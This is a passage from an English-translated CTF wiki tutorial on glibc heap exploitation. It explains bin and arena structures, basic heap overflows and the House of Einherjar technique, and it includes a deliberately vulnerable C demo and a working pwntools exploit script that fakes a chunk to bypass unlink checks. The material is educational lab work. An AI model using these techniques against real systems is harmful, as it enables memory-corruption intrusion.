<p>| 6 | 1 | No limit |</p> <p>Here we take the large bin of the 32-bit platform as an example. The size of the first chunk of the first large bin is 512 bytes, which is in the first group, so the size of the chunk that the bin can store is [512, 512 + 64).</p> <p>The macro about large bin is as follows. Here we take the initial chunk size of the first large bin on the 32-bit platform as 512 bytes, then 512&gt;&gt;6 = 8, so the subscript is 56+8= 64.</p> <pre><code>#define largebin_index_32(sz)                                                  \\\n\n    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                                     \\\n\n         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \\\n\n         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \\\n\n               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \\\n\n               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \\\n\n                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \\\n\n                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \\\n\n                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \\\n\n                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \\\n\n                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \\\n\n                                 : 126)\n\n\n\n#define largebin_index_32_big(sz)                                              \\\n\n    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                                     \\\n\n         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \\\n\n         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \\\n\n               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \\\n\n               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \\\n\n                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \\\n\n                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \\\n\n                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \\\n\n                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \\\n\n                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \\\n\n                                 : 126)\n\n\n\n// XXX It remains to be seen whether it is good to keep the widths of\n\n// XXX the buckets the same or whether it should be scaled by a factor\n\n// XXX of two as well.\n\n#define largebin_index_64(sz)                                                  \\\n\n    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                                     \\\n\n         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \\\n\n         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \\\n\n               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \\\n\n               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \\\n\n                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \\\n\n                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \\\n\n                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \\\n\n                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \\\n\n                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \\\n\n                                 : 126)\n\n\n\n#define largebin_index(sz)                                                     \\\n\n    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \\\n\n                                                ? largebin_index_32_big(sz)    \\\n\n                                                : largebin_index_32(sz))\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_structure/#unsorted-bin","title":"Unsorted Bin","text":"<p>Unsorted bin can be thought of as a buffer before the free chunk returns to its own bin.</p> <p>Its specific description in glibc is as follows</p> <pre><code>/*\n\n   Unsorted chunks\n\n\n\n    All remainders from chunk splits, as well as all returned chunks,\n\n    are first placed in the \"unsorted\" bin. They are then placed\n\n    in regular bins after malloc gives them ONE chance to be used before\n\n    binning. So, basically, the unsorted_chunks list acts as a queue,\n\n    with chunks being placed on it in free (and malloc_consolidate),\n\n    and taken off (to be either used or placed in bins) in malloc.\n\n\n\n    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it\n\n    does not have to be taken into account in size comparisons.\n\n */\n</code></pre> <p>From the macro below we can see</p> <pre><code>/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */\n\n#define unsorted_chunks(M) (bin_at(M, 1))\n</code></pre> <p>The unsorted bin is at the subscript 1 of the bin array we mentioned earlier. Therefore, the unsorted bin has only one linked list. Idle chunks in unsorted bin are out of order, with two main sources</p> <ul> <li>When a larger chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin.</li> <li>When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below.</li> </ul> <p>In addition, the traversal order used by Unsorted Bin during the process is FIFO.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#common-macro","title":"common macro","text":"<p>Here are some general macros.</p> <p>Unified to get the index of the chunk according to the size of the chunk</p> <pre><code>#define bin_index(sz)                                                          \\\n\n    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_structure/#top-chunk","title":"Top Chunk","text":"<p>The description of top chunk in glibc is as follows</p> <pre><code>/*\n\n   Top\n\n\n\n    The top-most available chunk (i.e., the one bordering the end of\n\n    available memory) is treated specially. It is never included in\n\n    any bin, is used only if no other chunk is available, and is\n\n    released back to the system if it is very large (see\n\n    M_TRIM_THRESHOLD).  Because top initially\n\n    points to its own bin with initial zero size, thus forcing\n\n    extension on the first malloc request, we avoid having any special\n\n    code in malloc to check whether it even exists yet. But we still\n\n    need to do so when getting memory from system, so we make\n    initial_top treat the bin as a legal but unusable chunk during the\n\n    interval between initialization and the first call to\n\n    sysmalloc. (This is somewhat delicate, since it relies on\n\n    the 2 preceding words to be zero during this interval as well.)\n\n */\n\n\n\n/* Conveniently, the unsorted bin can be used as dummy top on first call */\n\n#define initial_top(M) (unsorted_chunks(M))\n</code></pre> <p>When the program first performs malloc, the heap is divided into two pieces, one for the user, and the remaining one is the top chunk. In fact, the so-called top chunk is the chunk with the highest physical address in the current heap. This chunk does not belong to any bin. Its function is to allocate all the bins if they are not up to the specified size. If the size is not less than the specified size, the allocation is made and the remaining part is used as the new top chunk. Otherwise, the heap is expanded and then allocated. The heap is extended by sbrk in the main arena, and the new heap is allocated by the mmap in the thread arena.</p> <p>It should be noted that the prev_inuse bit of the top chunk is always 1, otherwise the previous chunk will be merged into the top chunk.</p> <p>** In the initial case, we can use the unsorted chunk as the top chunk. **</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#last-remainder","title":"last remainder","text":"<p>When a user uses malloc to request memory allocation, the chunk found by ptmalloc2 may not match the size of the requested memory. In this case, the remaining portion after the split is called the last remainder chunk, and the unsort bin will also store the chunk. The top chunk splits the rest of the section as a last remainder.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#macrostructure","title":"Macrostructure","text":""},{"location":"pwn/linux/glibc-heap/heap_structure/#arena","title":"arena","text":"<p>In the example we introduced earlier, whether it is the main thread or the newly created thread, there will be a separate arena when applying for memory for the first time. So will each thread have an independent arena? Below we will introduce in detail.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#arena-quantity","title":"arena Quantity","text":"<p>For different systems, the [constraints] of the number of arena (https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847) are as follows</p> <pre><code>For 32 bit systems:\n\n     Number of arena = 2 * number of cores.\n\nFor 64 bit systems:\n\n     Number of arena = 8 * number of cores.\n</code></pre> <p>Obviously, not every thread will have a corresponding arena. As for why the 64-bit system is set up, I don't want to understand it. In addition, because the number of cores per system is limited, when the number of threads is more than twice the number of cores (hyperthreading technology), there must be threads waiting, so there is no need to assign an arena to each thread.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#arena-distribution-rules","title":"arena Distribution Rules","text":"<p>**To be added. **</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#the-difference","title":"the difference","text":"<p>Unlike thread, main_arena is not in the applied heap, but a global variable in the data segment of libc.so.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#heap_info","title":"heap_info","text":"<p>When the program first starts executing, each thread has no heap area. When it applies for memory, it needs a structure to record the corresponding information, and the role of heap_info is this. And when the resources of the heap are used, you must apply for memory again. In addition, the generally applied heap is not continuous, so it is necessary to record the link structure between different heaps.</p> <p>**This data structure is specifically prepared for memory requested from the Memory Mapping Segment, which is prepared for non-primary threads. **</p> <p>The main thread can be extended by the program break location via the sbrk() function (until it touches the Memory Mapping Segment), with only one heap and no heap_info data structure.</p> <p>The main structure of heap_info is as follows</p> <pre><code>#define HEAP_MIN_SIZE (32 * 1024)\n\n#ifndef HEAP_MAX_SIZE\n\n# ifdef DEFAULT_MMAP_THRESHOLD_MAX\n\n#  define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)\n\n# else\n\n#  define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */\n\n# endif\n#endif\n\n\n/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps\n\n   that are dynamically created for multi-threaded programs.  The\n\n   maximum size must be a power of two, for fast determination of\n\n   which heap belongs to a chunk.  It should be much larger than the\n\n   mmap threshold, so that requests with a size just below that\n\n   threshold can be fulfilled without creating too many heaps.  */\n\n\n\n/***************************************************************************/\n\n\n\n/* A heap is a single contiguous memory region holding (coalesceable)\n\n   malloc_chunks.  It is allocated with mmap() and always starts at an\n\n   address aligned to HEAP_MAX_SIZE.  */\n\n\n\ntypedef struct _heap_info\n\n{\n\n  mstate ar_ptr; /* Arena for this heap. */\n\n  struct _heap_info *prev; /* Previous heap. */\n\n  size_t size;   /* Current size in bytes. */\n\n  size_t mprotect_size; /* Size in bytes that has been mprotected\n\n                           PROT_READ|PROT_WRITE.  */\n\n  /* Make sure the following data is properly aligned, particularly\n\n     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of\n\n     MALLOC_ALIGNMENT. */\n\n  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];\n\n} heap_info;\n</code></pre> <p>This structure is mainly to describe the basic information of the heap, including</p> <ul> <li>the address of the corresponding arena of the heap</li> <li>Since a thread requests a heap, it may be used up and must be applied again. Therefore, one thread may have multiple heaps. Prev records the address of the last heap_info. Here you can see that each heap's heap_info is linked through a singly linked list.</li> <li>size indicates the size of the current heap</li> <li>The last part ensures alignment (What is the reason for the negative use here?)</li> </ul> <p>It seems that the structure should be quite important, but if we look closely at the implementation of the full malloc, we will find that it does not appear frequently.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#malloc_state","title":"malloc_state","text":"<p>This structure is used to manage the heap and record the specific state of the memory of each arena's current application, such as whether there are free chunks, what size of free chunks, and so on. Whether it is thread arena or main arena, they all have only one malloc state structure. Since there may be more than one of the thread's arena, the malloc state structure will be in the latest application's arena.</p> <p>**Note that the main arena's malloc_state is not part of the heap segment, but a global variable stored in the libc.so data segment. **</p> <p>Its structure is as follows</p> <pre><code>struct malloc_state {\n\n    /* Serialize access.  */\n\n    __libc_lock_define(, mutex);\n\n\n\n    /* Flags (formerly in max_fast).  */\n\n    int flags;\n\n\n\n    /* Fastbins */\n\n    mfastbinptr fastbinsY[ NFASTBINS ];\n\n\n\n    /* Base of the topmost chunk -- not otherwise kept in a bin */\n\n    mchunkptr top;\n\n\n\n    /* The remainder from the most recent split of a small request */\n\n    mchunkptr last_remainder;\n\n\n    /* Normal bins packed as described above */\n\n    mchunkptr bins[ NBINS * 2 - 2 ];\n\n\n\n    /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/\n\n    unsigned int binmap[ BINMAPSIZE ];\n\n\n\n    /* Linked list, points to the next arena */\n\n    struct malloc_state *next;\n\n\n\n    /* Linked list for free arenas.  Access to this field is serialized\n\n       by free_list_lock in arena.c.  */\n\n    struct malloc_state *next_free;\n\n\n\n    /* Number of threads attached to this arena.  0 if the arena is on\n\n       the free list.  Access to this field is serialized by\n\n       free_list_lock in arena.c.  */\n\n    INTERNAL_SIZE_T attached_threads;\n\n\n\n    /* Memory allocated from the system in this arena.  */\n\n    INTERNAL_SIZE_T system_mem;\n\n    INTERNAL_SIZE_T max_system_mem;\n\n};\n</code></pre> <ul> <li> <p>__libc_lock_define(, mutex);</p> </li> <li> <p>This variable is used to control the serial access of the program to the same allocation area. When a thread acquires the allocation area, other threads must wait for the thread allocation to complete before they can access the allocation area.</p> </li> <li> <p>flags</p> </li> <li> <p>flags records some flags of the allocation area. For example, bit0 records whether the allocation area has a fast bin chunk, and bit1 identifies whether the allocation area can return a continuous virtual address space. details as follows</p> </li> </ul> <pre><code>/*\n\n   FASTCHUNKS_BIT held in max_fast indicates that there are probably\n\n   some fastbin chunks. It is set true on entering a chunk into any\n\n   fastbin, and cleared only in malloc_consolidate.\n\n   The truth value is inverted so that have_fastchunks will be true\n\n   upon startup (since statics are zero-filled), simplifying\n\n   initialization checks.\n\n */\n\n\n\n#define FASTCHUNKS_BIT (1U)\n\n\n\n#define have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)\n\n#define clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)\n\n#define set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)\n\n\n\n/*\n\n   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous\n\n   regions.  Otherwise, contiguity is exploited in merging together,\n\n   when possible, results from consecutive MORECORE calls.\n\n   The initial value comes from MORECORE_CONTIGUOUS, but is\n\n   changed dynamically if mmap is ever used as an sbrk substitute.\n\n */\n\n\n\n#define NONCONTIGUOUS_BIT (2U)\n\n\n\n#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)\n\n#define noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)\n\n#define set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)\n\n#define set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)\n\n\n\n/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the\n\n   arena.  Such an arena is no longer used to allocate chunks.  Chunks\n\n   allocated in that arena before detecting corruption are not freed.  */\n\n\n\n#define ARENA_CORRUPTION_BIT (4U)\n\n\n\n#define arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))\n\n#define set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)\n</code></pre> <ul> <li> <p>fastbinsY[NFASTBINS]</p> </li> <li> <p>a pointer to the head of each fast chunk list</p> </li> <li> <p>top</p> </li> <li> <p>Point to the top chunk of the allocation area</p> </li> <li> <p>last_reminder</p> </li> <li> <p>The remaining part after the latest chunk split</p> </li> <li> <p>bins</p> </li> <li> <p>A chunk list for storing unstored bins, small bins and large bins.</p> </li> <li> <p>binmap</p> </li> <li> <p>ptmalloc uses a bit to identify whether a bin contains free chunks.</p> </li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_structure/#malloc_par","title":"malloc_par","text":"<p>**! ! To be added! ! **</p>"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/","title":"Heap Overflow","text":""},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#introduction","title":"Introduction","text":"<p>Heap overflow means that the number of bytes written by the program into a heap block exceeds the number of bytes that can be used by the heap itself ( is the number of bytes that can be used instead of the number of bytes requested by the user, because the heap manager The number of bytes requested by the user is adjusted, which also causes the number of available bytes to be no less than the number of bytes requested by the user), thus causing data overflow and covering to ** physically adjacent high The next heap of addresses**.</p> <p>It is not difficult to find that the basic premise of a heap overflow vulnerability is</p> <ul> <li>The program writes data to the heap.</li> <li>The size of the data written is not well controlled.</li> </ul> <p>For the attacker, the heap overflow vulnerability can make the program crash, and the attacker can control the execution flow of the program.</p> <p>A heap overflow is a specific buffer overflow (and stack overflow, bss segment overflow, etc.). However, unlike stack overflow, there is no return address on the heap that allows the attacker to directly control the execution flow, so we generally cannot control EIP directly through heap overflow. In general, our strategy for using heap overflow is</p> <ol> <li> <p>Overwrite the contents of the next chunk physically adjacent to its .</p> <ul> <li>prev_size</li> </ul> </li> <li> <p>size, which has three main bits and the true size of the heap.         -   NON_MAIN_ARENA </p> <pre><code>-   IS_MAPPED\n\n-   PREV_INUSE\n\n-   the True chunk size\n</code></pre> </li> <li> <p>chunk content, which changes the execution flow inherent in the program.</p> </li> <li>Use the mechanism in the heap (such as unlink, etc.) to implement the arbitrary address write (Write-Anything-Anywhere) or control the contents of the heap block to control the execution flow of the program.</li> </ol>"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#basic-example","title":"Basic example","text":"<p>Let's take a simple example:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts(\"Get input:\");\n  gets(chunk);\n  return 0;\n}\n</code></pre> <p>The main purpose of this program is to call malloc to allocate memory on a heap, and then write a string to the heap. If the input string is too long, it will cause the area of the chunk to overflow and overwrite the top chunk. (In fact, puts internally calls malloc to allocate heap memory, which may not be covered by top chunk). <pre><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;===chunk\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;===top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n</code></pre></p> <p>Write 'A'*100 <pre><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;===chunk\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020: 0x4141414141414141  0x4141414141414141 &lt;===top chunk (has been overflowed)\n0x602030:   0x4141414141414141  0x4141414141414141\n0x602040:   0x4141414141414141  0x4141414141414141\n</code></pre></p>"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#_1","title":"\u5c0f\u8ff0","text":"<p>Several important steps in heap overflow:</p>"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#looking-for-heap-allocation-functions","title":"Looking for heap allocation functions","text":"<p>Usually the heap is allocated by calling the glibc function malloc, which in some cases uses the calloc assignment. The difference between calloc and malloc is that calloc is automatically emptied after allocation, which is fatal for the exploitation of certain information disclosure vulnerabilities.</p> <pre><code>calloc(0x20);\n//Equivalent to\nptr = malloc (0x20);\nmemset(ptr,0,0x20);\n</code></pre> <p>In addition to this, there is another type of allocation via realloc, which can function as both malloc and free. <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) \n{\n  char *chunk,*chunk1;\n  chunk=malloc(16);\n  chunk1=realloc(chunk,32);\n  return 0;\n}\n</code></pre></p> <p>The operation of realloc is not as simple as it is literally, and its internal operations will be different depending on different situations.</p> <ul> <li>When the size of realloc(ptr,size) is not equal to the size of ptr</li> <li>If the application size &gt; original size</li> <li>If the chunk is adjacent to the top chunk, extend the chunk directly to the new size.</li> <li>If the chunk is not adjacent to the top chunk, it is equivalent to free(ptr), malloc(new_size)</li> <li>If the application size &lt; original size</li> <li>If the difference is not enough to accommodate the next smallest chunk (32 bytes under 64 bits, 16 bytes under 32 bits), it remains unchanged</li> <li>If the difference can accommodate the next smallest chunk, then the original chunk is cut into two parts, and the part is free.</li> <li>When the size of realloc(ptr,size) is equal to 0, it is equivalent to free(ptr)</li> <li>When the size of realloc(ptr,size) is equal to the size of ptr, no action is taken.</li> </ul>"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#looking-for-dangerous-functions","title":"Looking for dangerous functions","text":"<p>By looking for dangerous functions, we quickly determine if the program is likely to have a heap overflow and, if so, where the heap overflows.</p> <p>Common dangerous functions are as follows</p> <ul> <li>Enter</li> <li>gets, read a line directly, ignoring <code>'\\x00'</code><ul> <li>scanf</li> <li>vscanf</li> </ul> </li> <li>output<ul> <li>sprintf</li> </ul> </li> <li>string</li> <li>strcpy, string copy, encountered <code>'\\x00'</code> stop</li> <li>strcat, string stitching, encountered <code>'\\x00'</code> stop</li> <li>bcopy</li> </ul>"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#determine-the-fill-length","title":"Determine the fill length","text":"<p>This part is mainly to calculate the distance between the address we started writing and the address we want to cover**. A common misconception is that the malloc parameter is equal to the actual allocated heap size, but in fact the size allocated by ptmalloc is aligned. This length is typically twice the word length, such as a 32-bit system with 8 bytes and a 64-bit system with 16 bytes. However, for requests that are no longer than 2 times the word length, malloc will directly return the block of 2 times the word length, which is the smallest chunk. For example, a 64-bit system executing <code>malloc(0)</code> will return a block with a user area of 16 bytes.</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(0);\n  puts(\"Get input:\");\n  gets(chunk);\n  return 0;\n}\n</code></pre> <pre><code>// According to the number of bits in the system, malloc will allocate 8 or 16 bytes of user space\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>Note that the size of the user area is not equal to chunk_hear.size, chunk_hear.size=user area size + 2* word length</p> <p>Another point is that the memory size of the user application mentioned above will be modified, and it is possible to store the content using the prev_size field of the next chunk that is physically adjacent to it. Go back and look at the previous sample code. <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts(\"Get input:\");\n  gets(chunk);\n  return 0;\n}\n</code></pre></p> <p>Looking at the above code, the chunk size we applied for is 24 bytes. But when we compile it into a 64-bit executable, the actual allocated memory will be 16 bytes instead of 24. <pre><code>0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n</code></pre></p> <p>How does the 16-byte space fit the next 24 bytes of content? The answer is to borrow the pre_size field of the next block. Let's take a look at the conversion between the size of the memory requested by the user and the amount of memory actually allocated in glibc.</p> <pre><code>/* pad request bytes into a usable size -- internal version */\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n#define request2size(req)                                                      \\\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \\\n         ? MINSIZE                                                             \\\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)\n</code></pre> <p>When req=24, request2size(24)=32. And remove the 16 bytes of the chunk header. In fact, the number of bytes available to the user is 16. According to what we learned earlier, we know that the chunk's pre_size only works when its previous block is released. So the user can actually use the prev_size field of the next chunk at this time, exactly 24 bytes. **Actually, ptmalloc allocates memory in double words as the basic unit. Taking 64-bit system as an example, the allocated space is an integer multiple of 16, that is, the chunks applied by the user are 16-byte aligned. **</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/","title":"House Of Einherjar","text":""},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#introduction","title":"Introduction","text":"<p>The house of einherjar is a heap utilization technique proposed by <code>Hiroki Matsukuma</code>. The heap exploit technique forces the <code>malloc</code> to return a chunk of almost any address. The main reason is to abuse the backward merge operation in <code>free</code> (combining chunks with low addresses), so as to avoid fragmentation as much as possible.</p> <p>In addition, it should be noted that in some special-sized heap blocks, off by one can not only modify the prev_size of the next heap block, but also modify the PREV_INUSE bit of the next heap block.</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#principle","title":"Principle","text":""},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#backward-merge-operation","title":"Backward merge operation","text":"<p>The backward merge core operation in the <code>free</code> function is as follows</p> <pre><code>        /* consolidate backward */\n\n        if (!prev_inuse(p)) {\n\n            prevsize = prev_size(p);\n\n            size += prevsize;\n\n            p = chunk_at_offset(p, -((long) prevsize));\n\nunlink (off, p, bck, fwd);\n        }\n</code></pre> <p>Here borrow a picture from the original author</p> <p></p> <p>For the overall operation, please refer to the chapter on \"Understanding the implementation of the heap\".</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#utilization-principle","title":"Utilization principle","text":"<p>Here we introduce the principle of the use. First of all, in the introduction of the previous heap, we can know the following knowledge</p> <ul> <li>Two physically adjacent chunks share the <code>prev_size</code> field, especially when the low-address chunk is in use, the chunk of the high-address chunk can be used by the chunk of the lower address. Therefore, we hope that the <code>prev_size</code> field of the high address chunk can be overwritten by writing the low address chunk.</li> <li>A chunk PREV_INUSE bit marks the usage state of its physically adjacent low address chunk, and this bit is physically adjacent to prev_size.</li> <li>When merging, the location of the new chunk depends on <code>chunk_at_offset(p, -((long) prevsize))</code>.</li> </ul> <p>**So if we can control a chunk prev_size and PREV_INUSE fields at the same time, then we can point the new chunk to almost any location. **</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#utilization-process","title":"Utilization process","text":""},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#before-overflow","title":"Before overflow","text":"<p>Assume that the state before overflow is as follows</p> <p></p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#overflow","title":"overflow","text":"<p>Here we assume that the p0 heap block can write the prev_size field on the one hand, on the other hand, there is a vulnerability of off by one, you can write the PREV_INUSE part of a chunk, then</p> <p></p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#after-overflow","title":"After overflow","text":"<p>** Suppose we set the prev_size field of p1 to the difference between the destination chunk location we want and p1**. After the overflow, we release p1, then the position of the new chunk we get <code>chunk_at_offset(p1, -((long) prevsize))</code> is the chunk location we want.</p> <p>Of course, it's important to note that since the new chunk is unlinked, you need to make sure that the fake chunk is constructed in the corresponding chunk location to bypass the unlink detection.</p> <p></p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#attack-process-example","title":"Attack process example","text":"<p>Code that can be used for House Of Einherjar attacks:</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;unistd.h&gt;\n\n\n\nint main(void){\n\n    char* s0 = malloc(0x200);\u3000//\u6784\u9020fake chunk\n\n    char* s1 = malloc(0x18);\n\n    char* s2 = malloc(0xf0);\u3000\n\nChar* s3 = malloc(0x20); //To prevent s2 from merging with top chunk\n    printf(\"begin\\n\");\n\n    printf(\"%p\\n\", s0);\n\n    printf(\"input s0\\n\");\n\n    read(0, s0, 0x200); //\u8bfb\u5165fake chunk\n\n    printf(\"input s1\\n\");\n\n    read(0, s1, 0x19); //Off By One\n\n    free(s2);\n\n    return 0;\n\n}\n</code></pre> <p>The attack code is as follows:</p> <pre><code>from pwn import *\n\n\n\np = process(\"./example\")\n\ncontext.log_level = 'debug'\n\n#gdb.attach(p)\n\np.recvuntil(\"begin\\n\")\n\naddress = int(p.recvline().strip(), 16)\n\np.recvuntil(\"input s0\\n\")\n\npayload = p64(0) + p64(0x101) + p64(address) * 2 + \"A\"*0xe0\n\n'''\n\nP64(address) * 2 is to bypass\nif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \\\n\n  malloc_printerr (\"corrupted double-linked list\");\n\n'''\n\npayload += p64(0x100) #fake size\n\np.sendline(payload)\n\np.recvuntil(\"input s1\\n\")\n\npayload = \"A\"*0x10 + p64(0x220) + \"\\x00\"\n\np.sendline(payload)\n\np.recvall()\n\np.close()\n</code></pre> <p>**Note that the method of bypassing unlink checking here is different from the method used in the previous unlink vulnerability.</p> <p>When using the unlink vulnerability:</p> <pre><code> p-&gt;fd = &amp;p-3*4\n\n p-&gt;bk = &amp;p-2*4\n</code></pre> <p>When used here, because there is no way to find <code>&amp;amp;p</code>, so let directly:</p> <pre><code>p-&gt;fd = p\n\np-&gt;bk = p\n</code></pre> <p>** There is one point to note here: **</p> <pre><code>payload = p64(0) + p64(0x101) + p64(address) * 2 + \"A\"*0xe0\n</code></pre> <p>In fact, it is ok to modify it to the following:</p> <pre><code>payload = p64(0) + p64(0x221) + p64(address) * 2 + \"A\"*0xe0\n</code></pre> <p>According to the truth, the size of the fake chunk is <code>0x221</code>, but why is <code>0x101</code>? This is because the validation of size and prev_size only happens in unlink, which is verified in unlink:</p> <pre><code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \\\n      malloc_printerr (\"corrupted size vs. prev_size\");\n</code></pre> <p>So just spoof the prev_size field of the next chunk of the fake chunk.</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#to-sum-up","title":"to sum up","text":"<p>Here we summarize the places that need to pay attention to this utilization technology.</p> <ul> <li>An overflow vulnerability is required to write the prev_size and PREV_INUSE parts of a physically adjacent high address.</li> <li>We need to calculate the difference between the destination chunk and the p1 address, so we need to leak the address.</li> <li>We need to construct the corresponding fake chunk near the destination chunk to bypass the unlink detection.</li> </ul> <p>In fact, this technology is similar to the chunk extend/shrink technology.</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#2016-seccon-tinypad","title":"2016 Seccon tinypad","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad)</p>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#basic-function-analysis","title":"Basic function analysis","text":"<p>First of all, it can be seen that a core read function since the program, that is, a string that reads a specified length of bytes, however, when the length of the read happens to be the specified length, a vulnerability of off by one will occur .</p> <p>Through the analysis program, we can easily see that the basic function of this program is to operate a tinypad, mainly the following operations</p> <ul> <li>At the beginning, the program judges each memo pointer at the beginning to judge whether it is empty. If it is not empty, it uses strlen to find its corresponding length, and outputs the content of memo. From here, we can also see that there are up to 4 memo.</li> <li>Add memo, traverse the variable tinypad that stores memo, determine if memo is being used according to the size of the tinypad's storage, and 